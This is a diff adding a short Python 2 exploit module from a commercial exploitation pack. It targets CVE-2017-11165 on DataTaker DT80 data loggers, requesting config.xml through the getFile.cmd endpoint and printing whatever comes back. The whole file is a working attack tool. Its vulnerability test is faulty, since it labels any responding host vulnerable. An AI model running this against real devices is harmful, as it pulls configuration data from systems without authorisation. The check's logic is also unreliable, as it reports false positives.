@@ -1,0 +1,39 @@
+#! /usr/bin/env python2
+ 
+#
+# Proprietary D2 Exploitation Pack source code - use only under the license
+# agreement specified in LICENSE.txt in your D2 Exploitation Pack
+#
+# Copyright DSquare Security, LLC, 2007-2017
+#
+
+###
+# STD modules
+###
+import os, sys, re
+import requests
+
+_name_   = 'd2sec_datataker_1'
+_vendor_ = 'datataker'
+_model_  = ['DT80']
+_vuln_   = 'Information disclosure Vulnerability'
+_cve_    = 'CVE-2017-11165'
+_ref_    = 'https://www.exploit-db.com/exploits/42313/'
+_port_   = 80
+
+def pwnrouter(host):
+  try:
+    url = "http://%s/services/getFile.cmd?userfile=config.xml" % host
+    response = requests.get(url)
+  except Exception, e:
+    print '[-] error : %s' % e
+    return
+  if response is None:
+    print '[+] %s not vulnerable' % host
+  else:
+    print '[+] %s vulnerable' % host
+    print response.text
+
+
+if __name__ == "__main__":
+  pwnrouter(sys.argv[1])
